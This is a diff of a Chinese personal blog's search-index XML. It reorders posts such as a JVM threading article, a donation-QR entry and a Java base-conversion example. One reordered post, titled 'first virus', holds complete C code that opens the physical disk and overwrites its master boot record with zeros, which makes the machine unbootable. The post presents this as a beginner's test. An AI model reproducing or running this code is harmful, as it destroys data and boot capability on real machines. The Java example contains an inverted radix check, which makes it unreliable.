@@ -29,7 +29,7 @@
 <p>在C/C++中.h .hpp文件为头文件，可以理解为啥呢，Java中的接口文件（类似哈，请不要较真）</p>
 <p>.c .cpp为具体的实现文件。</p>
 <p>在jvm.cpp找到JVM_ENTRY(void, JVM_StartThread(JNIEnv* env, jobject jthread))创建线程的入口。</p>
-<p><img src="https://tva1.sinaimg.cn/large/afc434bdgy1geytkudhdlj20mo0nz41j.jpg" alt="image"></p>
+<p><img src="https://tva2.sinaimg.cn/large/afc434bdgy1gf1aul792kj20nv0o4whm.jpg" alt="image"></p>
 <p>其中第6步的new JavaThread在<code>openjdk-jdk8u-jdk8u\hotspot\src\share\vm\runtime\thread.cpp</code></p>
 <p><code>JavaThread::JavaThread(ThreadFunction entry_point, size_t stack_sz)</code></p>
 <p>在调用pthread_create的时候，这里涉及到具体的操作系统</p>
@@ -1875,6 +1875,29 @@ y_i=\sum_jw_jx_{ij}</script><ol>
     </entry>
     
     <entry>
+      <title><![CDATA[测试支付图片]]></title>
+      <url>/2016/test-pay-pic/</url>
+      <content type="html"><![CDATA[<p>如果觉得有帮助，可以扫描下面的二维码请我喝茶哦！<br><a id="more"></a><br><img src="http://ww1.sinaimg.cn/large/afc434bdgy1firimwf047j205g05gq3i.jpg" alt=""> <img src="http://ww1.sinaimg.cn/large/afc434bdgy1firimbxo1aj205k05mt99.jpg" alt=""></p>
+]]></content>
+      
+        <categories>
+            
+            <category> other </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> 测试 </tag>
+            
+            <tag> 支付 </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[mysql-5.7.x安装]]></title>
       <url>/2016/mysql-5-7-x-install/</url>
       <content type="html"><![CDATA[<p>这篇文章主要讲解 mysql-5.7.x安装</p>
@@ -1896,29 +1919,6 @@ y_i=\sum_jw_jx_{ij}</script><ol>
         <tags>
             
             <tag> mysql-5.7.x </tag>
-            
-        </tags>
-        
-    </entry>
-    
-    <entry>
-      <title><![CDATA[测试支付图片]]></title>
-      <url>/2016/test-pay-pic/</url>
-      <content type="html"><![CDATA[<p>如果觉得有帮助，可以扫描下面的二维码请我喝茶哦！<br><a id="more"></a><br><img src="http://ww1.sinaimg.cn/large/afc434bdgy1firimwf047j205g05gq3i.jpg" alt=""> <img src="http://ww1.sinaimg.cn/large/afc434bdgy1firimbxo1aj205k05mt99.jpg" alt=""></p>
-]]></content>
-      
-        <categories>
-            
-            <category> other </category>
-            
-        </categories>
-        
-        
-        <tags>
-            
-            <tag> 测试 </tag>
-            
-            <tag> 支付 </tag>
             
         </tags>
         
@@ -2847,23 +2847,24 @@ y_i=\sum_jw_jx_{ij}</script><ol>
     </entry>
     
     <entry>
-      <title><![CDATA[第一个病毒]]></title>
-      <url>/2013/first-virus/</url>
-      <content type="html"><![CDATA[<p>这篇文章主要讲解 使用c写一个小程序<br>下面是初学c语言写的代码（测试，自行承担后果哦）：<br><a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line">#include &lt;stdlib.h&gt; </span><br><span class="line"> </span><br><span class="line">int main() </span><br><span class="line">&#123;</span><br><span class="line"> char buffer[512]=&quot;0&quot;;</span><br><span class="line">    FILE * fd=fopen(&quot;\\\\.\\PHYSICALDRIVE0&quot;,&quot;rb+&quot;); </span><br><span class="line">    if (fd == NULL) </span><br><span class="line">        return 0;  </span><br><span class="line">    fseek(fd,0,SEEK_SET); </span><br><span class="line">    fwrite(buffer,512,1,fd);</span><br><span class="line"> printf(&quot;hello,你中毒了！\n&quot;);</span><br><span class="line">    fclose(fd); </span><br><span class="line">    return 0; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+      <title><![CDATA[任意进制的转换]]></title>
+      <url>/2013/java-any-hex-convert/</url>
+      <content type="html"><![CDATA[<p>这篇文章主要讲解 BigInteger实现进制转换</p>
+<p>这个进制的转换最大支持36进制，也就是10进制+26个字母用到了BigInteger类的toString(int radix)方法<br><a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">package cn.xxz;</span><br><span class="line">import java.util.*;</span><br><span class="line">import java.math.*;</span><br><span class="line">public class Num2Radix &#123;</span><br><span class="line">	public static void main( String[] args ) &#123; /*最大支持36进制转换*/</span><br><span class="line">		Scanner sc	= new Scanner( System.in );</span><br><span class="line">		int	num	= sc.nextInt();</span><br><span class="line">		int	radix	= sc.nextInt();</span><br><span class="line">		if ( radix &lt; 36 ) &#123;</span><br><span class="line">			System.out.println( &quot;不支持大于36进制的转换！&quot; );</span><br><span class="line">			return;</span><br><span class="line">		&#125;</span><br><span class="line">		System.out.println( test( num, radix ) );</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	public static String test( int num, int radix ) &#123;</span><br><span class="line">		BigInteger	b	= new BigInteger( num + &quot;&quot; );</span><br><span class="line">		String		str	= b.toString( radix );</span><br><span class="line">		return(str);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
 ]]></content>
       
         <categories>
             
-            <category> c </category>
+            <category> java </category>
             
         </categories>
         
         
         <tags>
             
-            <tag> 病毒 </tag>
+            <tag> 10进制 </tag>
             
-            <tag> c </tag>
+            <tag> 36进制 </tag>
             
         </tags>
         
@@ -2891,24 +2892,23 @@ y_i=\sum_jw_jx_{ij}</script><ol>
     </entry>
     
     <entry>
-      <title><![CDATA[任意进制的转换]]></title>
-      <url>/2013/java-any-hex-convert/</url>
-      <content type="html"><![CDATA[<p>这篇文章主要讲解 BigInteger实现进制转换</p>
-<p>这个进制的转换最大支持36进制，也就是10进制+26个字母用到了BigInteger类的toString(int radix)方法<br><a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">package cn.xxz;</span><br><span class="line">import java.util.*;</span><br><span class="line">import java.math.*;</span><br><span class="line">public class Num2Radix &#123;</span><br><span class="line">	public static void main( String[] args ) &#123; /*最大支持36进制转换*/</span><br><span class="line">		Scanner sc	= new Scanner( System.in );</span><br><span class="line">		int	num	= sc.nextInt();</span><br><span class="line">		int	radix	= sc.nextInt();</span><br><span class="line">		if ( radix &lt; 36 ) &#123;</span><br><span class="line">			System.out.println( &quot;不支持大于36进制的转换！&quot; );</span><br><span class="line">			return;</span><br><span class="line">		&#125;</span><br><span class="line">		System.out.println( test( num, radix ) );</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	public static String test( int num, int radix ) &#123;</span><br><span class="line">		BigInteger	b	= new BigInteger( num + &quot;&quot; );</span><br><span class="line">		String		str	= b.toString( radix );</span><br><span class="line">		return(str);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+      <title><![CDATA[第一个病毒]]></title>
+      <url>/2013/first-virus/</url>
+      <content type="html"><![CDATA[<p>这篇文章主要讲解 使用c写一个小程序<br>下面是初学c语言写的代码（测试，自行承担后果哦）：<br><a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line">#include &lt;stdlib.h&gt; </span><br><span class="line"> </span><br><span class="line">int main() </span><br><span class="line">&#123;</span><br><span class="line"> char buffer[512]=&quot;0&quot;;</span><br><span class="line">    FILE * fd=fopen(&quot;\\\\.\\PHYSICALDRIVE0&quot;,&quot;rb+&quot;); </span><br><span class="line">    if (fd == NULL) </span><br><span class="line">        return 0;  </span><br><span class="line">    fseek(fd,0,SEEK_SET); </span><br><span class="line">    fwrite(buffer,512,1,fd);</span><br><span class="line"> printf(&quot;hello,你中毒了！\n&quot;);</span><br><span class="line">    fclose(fd); </span><br><span class="line">    return 0; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
 ]]></content>
       
         <categories>
             
-            <category> java </category>
+            <category> c </category>
             
         </categories>
         
         
         <tags>
             
-            <tag> 10进制 </tag>
+            <tag> 病毒 </tag>
             
-            <tag> 36进制 </tag>
+            <tag> c </tag>
             
         </tags>
         
